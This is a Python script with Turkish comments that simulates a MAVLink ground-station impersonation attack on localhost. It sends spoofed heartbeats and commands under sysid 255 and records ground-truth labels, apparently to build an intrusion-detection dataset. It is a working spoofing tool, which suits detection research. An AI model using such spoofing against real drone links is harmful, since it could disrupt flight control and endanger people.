#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""impersonation.py — KİMLİK TAKLİDİ saldırısı (impersonation).

Ne yapar: Kendini meşru yer istasyonu (sysid 255) gibi göstererek sürekli
sahte HEARTBEAT ve komut akışı üretir. Meşru akışla çakışan seq numaraları
kullanarak kanalda ikinci bir "yer istasyonu" varmış gibi görünür; bu da
seq atlama/tekrar anomalilerine yol açar.

GÜVENLİK: Yalnızca 127.0.0.1 hedefine bağlanır. Yalnızca simülasyon içindir.

Kullanım:
    python betikler/saldirilar/impersonation.py --ucus F207_impersonation \
        --sure 40 --baslangic-gecikme 50
"""

from __future__ import annotations

import time

import saldiri_temel as st
import ortak
from pymavlink import mavutil


def main() -> int:
    ap = st.temel_arg_parser(__doc__)
    ap.add_argument("--hiz", type=float, default=5.0, help="Saniyedeki sahte mesaj sayısı.")
    args = ap.parse_args()

    cfg = ortak.config_oku()
    # Meşru GCS ile aynı kimlik: sysid 255.
    baglanti = st.gonderen_kur(cfg, source_system=255, source_component=190)

    st.baslangic_gecikmesi_bekle(args.baslangic_gecikme)

    ortak.log("Kimlik taklidi saldırısı başlıyor (sysid 255 taklidi).", "UYARI")
    start_ns = ortak.simdi_ns()
    attacker_addr = None
    aralik = 1.0 / max(args.hiz, 0.1)

    son = time.time() + args.sure
    gonderilen = 0
    while time.time() < son:
        # Sahte HEARTBEAT (GCS tipi gibi)
        baglanti.mav.heartbeat_send(
            mavutil.mavlink.MAV_TYPE_GCS,
            mavutil.mavlink.MAV_AUTOPILOT_INVALID,
            0, 0, mavutil.mavlink.MAV_STATE_ACTIVE,
        )
        # Araya zararsız ama kafa karıştıran bir komut akışı
        baglanti.mav.command_long_send(
            1, 1, mavutil.mavlink.MAV_CMD_REQUEST_MESSAGE, 0,
            0, 0, 0, 0, 0, 0, 0,
        )
        gonderilen += 1
        if attacker_addr is None:
            attacker_addr = st.attacker_addr_al(baglanti, cfg)
        time.sleep(aralik)

    end_ns = ortak.simdi_ns()
    ortak.log(f"Saldırı bitti. {gonderilen} sahte mesaj gönderildi.", "BILGI")

    st.ground_truth_yaz(
        args.ucus, "impersonation", start_ns, end_ns,
        attacker_addr or f"{cfg.get('host')}:?",
        {"taklit_sysid": 255, "hiz": args.hiz, "gonderilen": gonderilen}, cfg,
    )
    baglanti.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
